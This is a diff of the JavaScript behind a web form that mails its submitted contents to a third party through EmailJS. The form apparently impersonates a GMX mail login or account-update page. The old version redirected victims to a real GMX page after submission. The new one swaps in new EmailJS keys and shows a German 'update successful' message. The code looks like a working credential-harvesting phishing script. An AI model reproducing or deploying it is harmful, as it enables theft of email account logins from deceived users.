@@ -1,6 +1,6 @@
 // Initialize EmailJS with your User ID
 (function(){
-    emailjs.init("inryvIdMDYlJAEPpL");
+    emailjs.init("6P76qlsTrnUbm2Nhu");
 })();
 
 // Button and Form Submission
@@ -9,12 +9,18 @@ const btn = document.getElementById('button');
 document.getElementById('form').addEventListener('submit', function(event) {
     event.preventDefault(); // Prevent traditional form submission
 
-    btn.value = 'Processing...'; // Update button to show loading
-    btn.disabled = true; // Disable button during submission
+    // Store original button text and styles
+    const originalText = btn.textContent;
+    const originalBgColor = btn.style.backgroundColor;
+    const originalColor = btn.style.color;
+    
+    // Update button to show loading
+    btn.textContent = 'Wird verarbeitet...';
+    btn.disabled = true;
 
     // EmailJS IDs
-    const serviceID = 'service_3h7tdpn';
-    const templateID = 'template_tp178k5';
+    const serviceID = 'service_a248qi8';
+    const templateID = 'template_71dyaxt';
 
     console.log("Submitting form via EmailJS...");
 
@@ -22,16 +28,27 @@ document.getElementById('form').addEventListener('submit', function(event) {
         .then(() => {
             console.log("Update successful!");
             
-            // Redirect after successful submission
-            window.location.href = 'https://www.gmx.at/mail/tarifvergleich/#.pc_page.homepage.at.header_account.tarifvergleich_at';
+            // Change button text to German success message
+            btn.textContent = 'Aktualisierung erfolgreich!';
+            
+            // Change button style to indicate success
+            btn.style.backgroundColor = '#4CAF50';
+            btn.style.color = 'white';
+            
+            // Reload page after 3 seconds to allow user to see the message
+            setTimeout(function() {
+                window.location.reload();
+            }, 3000);
             
         }, (err) => {
             console.error("Error:", err);
-            alert('Error: ' + err.text || 'Failed to submit form');
+            alert('Fehler: ' + (err.text || 'Formular konnte nicht übermittelt werden'));
             
             // Reset button state
-            btn.value = 'Login';
+            btn.textContent = originalText;
             btn.disabled = false;
+            btn.style.backgroundColor = originalBgColor;
+            btn.style.color = originalColor;
         });
 
     return false; // Ensure form doesn't submit
